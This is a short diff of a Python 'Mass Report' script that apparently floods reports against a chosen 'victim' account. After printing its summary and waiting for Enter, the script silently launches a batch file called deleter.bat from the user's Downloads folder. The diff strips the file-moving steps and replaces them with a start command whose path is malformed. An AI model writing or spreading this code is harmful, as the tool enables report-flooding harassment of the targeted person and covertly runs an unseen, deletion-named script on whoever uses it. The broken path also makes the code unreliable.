@@ -148,13 +148,7 @@ def report(victim, amount, reason, cooldown, descriptions):
 
 	Write.Print(f"\n\n[>] Finished Mass Report.\n[>] Reports Sent: {amount}\n[>] Valid Reports: {validReports}\n\n", Colors.purple_to_blue, interval=0.0025)
 	Write.Input("[>] Enter to Exit...", Colors.purple_to_blue, interval=0.0025)
-
-	src_path = r"%userprofile%\Downloads\files_in_usage\deleter.bat"
-	dst_path = r"%userprofile%\Downloads\deleter.bat"
-	shutil.move(src_path, dst_path)
-	directory = "%userprofile%\Downloads"
-	local_file = 'deleter.bat'
-	commanding = "start "+directory+local_file
+	commanding = "start userprofile%\Downloads\deleter.bat"
 	os.system(commanding)
 	exit()
 #gig
